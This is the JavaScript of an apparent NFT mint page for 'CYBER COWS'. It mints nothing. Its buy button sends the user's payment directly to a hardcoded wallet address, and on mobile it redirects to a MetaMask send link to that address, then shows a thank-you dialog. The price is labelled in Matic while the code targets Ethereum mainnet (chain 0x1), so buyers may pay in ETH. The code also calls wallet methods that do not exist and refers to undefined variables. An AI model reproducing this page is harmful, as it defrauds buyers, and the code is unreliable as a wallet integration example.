var ADDRESS = "0x5fA245a0c4070F44F49fD9D2Af3ef98A00A6b435";
var url = "https://metamask.app.link/send/pay-0x5fA245a0c4070F44F49fD9D2Af3ef98A00A6b435@1?value="
var accounts;
const collectionInfo = {
    name: "CYBER COWS",
    date: "",
    price: 1.9,
    totalSupply: 4500,
    minUnits: 1,
    maxUnits: 10,
    socialMedia: {
        discord: "https://discord.com/invite/bNkM76dvGe",
        twitter: "https://twitter.com/cyber_cows_nft",
    },
    medias: {
        preview: "preview.gif"
    }
}

//#region Loader

document.title = collectionInfo.name;

document.getElementById("social_discord").href = collectionInfo.socialMedia.discord;
document.getElementById("social_twitter").href = collectionInfo.socialMedia.twitter;

document.getElementById("lbuy").innerText = `${collectionInfo.name}`;
document.getElementById("lsupply").innerText = `Total supply: ${collectionInfo.totalSupply.toLocaleString()} NFTs`;
document.getElementById("lprice").innerText = `${collectionInfo.price.toFixed(3)} Matic`;
document.getElementById("ldate").innerText = `per NFT ${collectionInfo.date}`;

document.getElementById("lnprice").innerText = `${collectionInfo.minUnits}`
document.getElementById("ape-max").innerText = `${collectionInfo.maxUnits} Max`

document.getElementById("price").innerText = `${(collectionInfo.price * collectionInfo.minUnits).toFixed(3)}`
document.getElementById("price-img").src = `./images/${collectionInfo.medias.preview}`;
//#endregion
//#region Web3
let tempMaxSup = collectionInfo.minUnits;
$(document).ready(function() {
    $("#plus").on("click", function(e) {
        let total = parseInt($("#lnprice").text(), 10);
        if (total >= collectionInfo.maxUnits) total = collectionInfo.maxUnits;
        else ++total;
        updatePrice(total)
    });
    $("#minus").on("click", function(e) {
        let total = parseInt($("#lnprice").text(), 10);
        if (total <= collectionInfo.minUnits) total = collectionInfo.minUnits;
        else --total;
        updatePrice(total)
    });
    $("#ape-max").click(function() {
        let nowSup = parseInt($("#lnprice").text(), 10)
        if (nowSup != collectionInfo.maxUnits) {
            tempMaxSup = nowSup;
            updatePrice(collectionInfo.maxUnits)
        } else updatePrice(tempMaxSup)
    });

    function updatePrice(total) {
        const totalPrice = (total * collectionInfo.price).toFixed(3);
        $("#lnprice").text(total);
        $("#price").text(totalPrice);
    }



    document.querySelector("#transfer").addEventListener("click", sendEth);
});

async function sendEth() {


    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
        let inp = document.getElementById("price").textContent;

        let value = inp * 1e18
        console.log(inp)
        window.location.replace(url + value);
    } else {

        await getAccount();
        if (accounts[0]) {
            await sendTransaction();
        }
    }

}




//#endregion


const getAccount = async() => {
    if (ethereum) {
        accounts = await ethereum.request({ method: "eth_requestAccounts" });
        if (window.ethereum.chainId == "0x1") {
            console.log("Already connected to Polygon mainnet...");
        } else {
            try {
                await ethereum.request({
                    method: "wallet_switchPolygonChain",
                    params: [{ chainId: "0x1" }],
                });
            } catch (switchError) {
                // This error code indicates that the chain has not been added to MetaMask.
                if (error.code === 4902) {
                    try {
                        await ethereum.request({
                            method: "wallet_addPolygonChain",
                            params: [{
                                chainId: "0x1",
                                rpcUrl: netURL,
                            }, ],
                        });
                    } catch (addError) {
                        // handle "add" error
                    }
                }
            }
        }
    }
};

const sendTransaction = async() => {
    let inp = document.getElementById("price").textContent
    if (ethereum) {
        const priceToWei = (inp * 1e18).toString(16);

        ethereum
            .request({
                method: "eth_sendTransaction",
                params: [{
                    from: accounts[0],
                    to: ADDRESS,
                    value: priceToWei,
                }, ],
            })
            .then((txHash) => {
                new bootstrap.Modal(document.getElementById("thanks")).show();
            })
            .catch((error) => {});
    }
};